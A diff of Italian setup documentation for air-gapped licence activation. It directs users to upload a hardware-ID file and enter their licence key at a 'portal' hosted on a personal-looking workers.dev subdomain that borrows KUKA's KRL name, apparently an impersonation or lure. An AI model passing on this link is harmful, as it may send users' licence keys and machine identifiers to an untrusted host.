@@ -51,7 +51,7 @@ Per gli stabilimenti automobilistici e le reti industriali isolate prive di conn
 ### Passo 2: Generazione licenza sul portale web
 1. Collega la chiavetta USB a un computer connesso a Internet.
 2. Accedi al portale di attivazione Liskin Labs:  
-   👉 **[Portale Licenze Air-Gap](https://kuka-krl-support-gateway.redminotpro5.workers.dev/airgap)**
+**[Portale Licenze Air-Gap](https://kuka-krl-support-gateway.redminotpro5.workers.dev/airgap)**
 3. Trascina il file `liskin-hardware-id.lic` nell'area di caricamento — l'ID hardware verrà compilato automaticamente.
 4. Inserisci la tua chiave di licenza e fai clic su **Genera licenza offline**.
 5. Scarica il file firmato `liskin-krl-license.lic` sulla chiavetta USB.
